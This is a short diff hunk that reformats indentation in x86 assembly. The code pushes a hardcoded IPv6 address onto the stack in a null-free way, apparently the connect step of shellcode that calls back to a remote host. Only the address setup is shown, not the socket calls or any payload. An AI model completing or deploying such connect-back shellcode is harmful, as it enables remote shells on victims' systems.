@@ -20,14 +20,14 @@ _start:
 
 	;connect
 	; IPv6: 2a02:b0c0:1:e0:0:0:6ae:2002
-  xor eax, eax
+  	xor eax, eax
 	push 0x0220ae06 ;6ae:2002
-  push eax ;0:0
+  	push eax ;0:0
 	; 0001:00e0 -> e0000100
 	mov bx, 0xe0e0
 	mov bl, al ;al is 0x0
 	push bx
-  mov bx, 0x0101
+  	mov bx, 0x0101
 	mov bl, al ;al is 0x0
 	push bx
 	push 0xc0b0022A ; 2a02:b0c0
